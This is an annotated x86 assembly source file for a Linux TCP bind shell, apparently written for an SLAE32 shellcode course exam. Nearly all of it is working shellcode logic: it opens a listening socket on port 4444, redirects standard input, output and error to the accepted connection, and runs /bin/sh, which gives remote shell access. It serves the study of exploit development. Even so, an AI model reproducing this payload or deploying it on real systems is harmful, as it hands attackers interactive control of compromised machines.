; tcp_bind_shell_x86.nasm 
; Author: Jack McBride (PA-6483)
; Website: https://jacklgmcbride.co.uk
; 
; Purpose: SLAE32 exam assignment
;
; Assignment 1: Linux x86 TCP Bind Shell


global _start

section .text

_start:
			; Linux x86 bind tcp shell
			; set up socket()
			; set up bind()
			; set up listen()
			; set up accept()
			; set up dup2()
			; set up execve()

_socket:

	; Clear EAX register and set al to syscall number 102 in hex.
	xor eax, eax
	mov al, 0x66 

	; Clear EBX register and set bl to 0x1 for socket.
	xor ebx, ebx
	mov bl, 0x1

	; Clear ECX register and push values for protocol, type and domain to the stack
	xor ecx, ecx
	push ecx;	protocol - 0 (0x00000000)
	push 0x1;	type - 1 (0x1)
	push 0x2;	domain - PF_INET (0x2)

	; set ECX to the top of the stack to point to args
	mov ecx, esp

	; Execute socket() syscall
	int 0x80

_bind:

	; Clear and set EDX to socket file descriptor returned by socket()
	xor edx, edx
	mov edx, eax

	; Clear EAX register and set al to syscall number 102 in hex.
	xor eax, eax
	mov al, 0x66

	; Clear EBX register and set bl to 0x2 for bind()
	mov bl, 0x2
	
	; Push sockaddr arguments for call to bind()
	xor ecx, ecx
	push ecx; 		sin_addr - INADDR_ANY (0x00000000)
	push word PORT;		sin_port - 4444 (0x5c11)
	push word 0x2;		sin_family - AF_INET (2)

	; Save pointer to sockaddr to ESI register 
	mov esi, esp

	push 0x10;		addrlen - 16 (0x10)
	push esi;		addr
	push edx;		sockfd

	; Set ECX to the top of the stack to point to args
	mov ecx, esp;

	; Execute bind() syscall
	int 0x80

_listen:
	
	; Clear EAX regster and set al to syscall number 102 in hex.
	mov al, 0x66

	; Clear EBX register and set bl to 0x4 for listen()
	mov bl, 0x4

	; Push arguments to stack for call to listen()
	push byte 0x2
	push edx

	; set ECX to the top of the stack to point to args
	mov ecx, esp

	; Execute listen() syscall
	int 0x80

_accept:

	; Clear EAX register and set al to syscall number 102 in hex.
	mov al, 0x66

	; Clear EBX register and set bl to 0x5 for accept()
	mov bl, 0x5

	; Clear ECX and push arguments for call to accept()
	xor ecx, ecx
	push ecx;		addrlen - NULL
	push ecx;		addr - NULL
	push edx;		sockfd - stored in EDX

	; Set ECX to stack for call to accept()
	mov ecx, esp

	; Execute accept() syscall
	int 0x80

_dup2:
	
	; Push the EAX register containing the socket file descriptor returned from accept()	
	push eax

	; Clear EAX register and set al to syscall number 63 in hex.
	mov al, 0x3f
	pop ebx;		POP socket file descriptor into EBX for dup2 syscall
	xor ecx, ecx;		Clear ECX register for initial redirection of STDIN (0)
	int 0x80;		Execute dup2() syscall

	; Set dup2() syscall for STDOUT
	mov al, 0x3f
	mov cl, 0x1
	int 0x80

	; Set dup2() syscall for STDERR
	mov al, 0x3f
	mov cl, 0x2
	int 0x80

_execve:

	; Clear EAX register and set al to syscall number 11 in hex.
	mov al, 0xb

	; Push pathname string to the stack and set the EBX register to it
	xor ebx, ebx
	push ebx;			NULL terminate the string
	push 0x68732f6e;		hs/n - 0x68732f6e
	push 0x69622f2f;		ib// - 0x69622f2f
	mov ebx, esp;

	; Clear the ECX and EDX registers for argv and envp
	xor ecx, ecx
	xor edx, edx

	; Execute execve() syscall
	int 0x80
